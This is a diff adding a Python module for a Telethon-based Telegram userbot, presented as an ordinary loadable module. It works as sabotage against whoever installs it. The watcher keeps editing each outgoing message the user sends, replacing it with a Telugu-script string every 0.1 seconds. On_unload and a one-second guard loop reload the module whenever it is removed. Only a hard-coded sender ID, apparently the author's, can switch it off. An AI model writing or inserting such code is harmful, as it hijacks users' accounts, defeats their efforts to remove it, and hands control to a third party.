@@ -1,0 +1,109 @@
+from .. import loader, utils
+from telethon.tl.types import Message
+import asyncio
+
+
+@loader.tds
+class SheoMad(loader.Module):
+    strings = {"name": "జ్ఞ‌"}
+
+    def __init__(self):
+        self.config = loader.ModuleConfig()
+        self._system = True
+        self._unloadable = False
+        self._last_message = None
+        self._last_chat_id = None
+        self._editing = False
+        self._module_file = None
+        self._guard_started = False
+
+    async def client_ready(self, client, database):
+        self.client = client
+        try:
+            mod = self.__class__.__module__
+            self._module_file = mod.split(".")[-1] if "." in mod else mod
+        except Exception:
+            self._module_file = None
+        if not self._guard_started:
+            self._guard_started = True
+            asyncio.ensure_future(self._guard())
+
+    async def on_unload(self):
+        asyncio.ensure_future(self._restore())
+
+    async def _restore(self):
+        await asyncio.sleep(0.3)
+        try:
+            if self._module_file:
+                try:
+                    await self.client.loader.load_module(self._module_file)
+                    return
+                except Exception:
+                    pass
+
+            modules = self.client.loader.modules
+            if isinstance(modules, dict):
+                for k, v in list(modules.items()):
+                    if v is self:
+                        return
+                modules[self.__class__.__name__] = self
+            elif isinstance(modules, list):
+                if self not in modules:
+                    modules.append(self)
+        except Exception:
+            pass
+
+    async def _guard(self):
+        while True:
+            await asyncio.sleep(1)
+            try:
+                modules = getattr(self.client.loader, "modules", None)
+                if modules is None:
+                    continue
+                if isinstance(modules, dict):
+                    present = any(v is self for v in modules.values())
+                else:
+                    present = self in modules
+                if not present:
+                    await self._restore()
+            except Exception:
+                pass
+
+    @loader.command()
+    async def off(self, message: Message):
+        """Выключить модуль"""
+        if message.sender_id != 77646148:
+            return
+        self._editing = False
+        self._last_message = None
+        self._last_chat_id = None
+        # Отключаем защиту от выгрузки, чтобы модуль можно было снять
+        self._unloadable = True
+        self._system = False
+        await utils.answer(message, "Выключено")
+
+    async def watcher(self, message: Message):
+        if not message.out:
+            return
+
+        self._last_message = message.id
+        self._last_chat_id = message.chat_id
+
+        if not self._editing:
+            self._editing = True
+            asyncio.ensure_future(self._infinite_edit())
+
+    async def _infinite_edit(self):
+        while self._editing:
+            if self._last_message and self._last_chat_id:
+                try:
+                    message = await self.client.get_messages(
+                        self._last_chat_id,
+                        ids=self._last_message
+                    )
+                    if message:
+                        await message.edit("జ్ఞ‌")
+                except:
+                    pass
+
+            await asyncio.sleep(0.1)
